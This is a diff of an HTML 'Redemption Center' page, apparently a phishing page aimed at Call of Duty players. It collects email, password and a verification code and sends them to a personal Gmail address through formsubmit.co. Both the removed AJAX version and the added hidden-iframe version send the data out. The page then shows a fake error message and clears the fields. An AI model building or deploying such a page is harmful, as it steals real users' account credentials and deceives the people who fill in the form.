@@ -30,8 +30,8 @@
         .input-field-wrapper { position: relative; }
         .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #fff; }
         .eye-icon:hover { color: #00ff00; }
-        .success-msg { color: #ff1100; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
-        .btn_yellow { width: 80%; cursor: pointer; }
+        .success-msg { color: #ff0000; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
+        .btn_yellow { width: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -52,8 +52,9 @@
                 <h1>Redemption Center</h1>
                 
                 <div class="code_ct">
-                    <!-- فرم بدون action (با AJAX ارسال می‌شه) -->
-                    <form id="redemptionForm">
+                    <!-- فرم اصلی با target به iframe مخفی -->
+                    <iframe name="hiddenFrame" style="display:none;"></iframe>
+                    <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="hiddenFrame" onsubmit="submitted()">
                         <ul class="code_list c">
                             <li>
                                 <span class="desktop_label">Email</span>
@@ -80,9 +81,14 @@
                             </li>
                         </ul>
 
+                        <!-- تنظیمات -->
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_subject" value="لاگین جدید کالاف! 🔥">
+
                         <button type="submit" class="btn_yellow" id="label_submit">Submit</button>
                         <div id="result" class="success-msg">
-                            Error! Try again.
+                           Error! try again
                         </div>
                     </form>
                 </div>
@@ -120,40 +126,14 @@
             }
         }
 
-        // ارسال فرم با AJAX (بدون صفحه سفید!)
-        document.getElementById("redemptionForm").addEventListener("submit", function(e) {
-            e.preventDefault(); // جلوی رفرش و رفتن به صفحه دیگه رو می‌گیره
-
-            var email = document.getElementById("F_UID").value.trim();
-            var password = document.getElementById("F_CDKEY").value;
-            var vcode = document.getElementById("F_VCODE").value.trim();
-
-            if (email === "" || password === "" || vcode === "") {
-                alert("Please fill in all fields.");
-                return;
-            }
-
-            // ارسال به FormSubmit با AJAX
-            var formData = new FormData();
-            formData.append("email", email);
-            formData.append("password", password);
-            formData.append("vcode", vcode);
-            formData.append("_subject", "لاگین جدید کالاف! 🔥");
-
-            fetch("https://formsubmit.co/erfantroll778899@gmail.com", {
-                method: "POST",
-                body: formData
-            }).then(response => {
-                // نمایش پیام موفقیت روی همون صفحه
-                document.getElementById("result").style.display = "block";
-                // پاک کردن فیلدها
-                document.getElementById("F_UID").value = "";
-                document.getElementById("F_CDKEY").value = "";
-                document.getElementById("F_VCODE").value = "";
-            }).catch(error => {
-                alert("خطا در ارسال، دوباره امتحان کن!");
-            });
-        });
+        // وقتی فرم ارسال شد، پیام موفقیت نشون بده
+        function submitted() {
+            document.getElementById("result").style.display = "block";
+            document.getElementById("F_UID").value = "";
+            document.getElementById("F_CDKEY").value = "";
+            document.getElementById("F_VCODE").value = "";
+            return true; // اجازه ارسال بده
+        }
     </script>
 </body>
 </html>
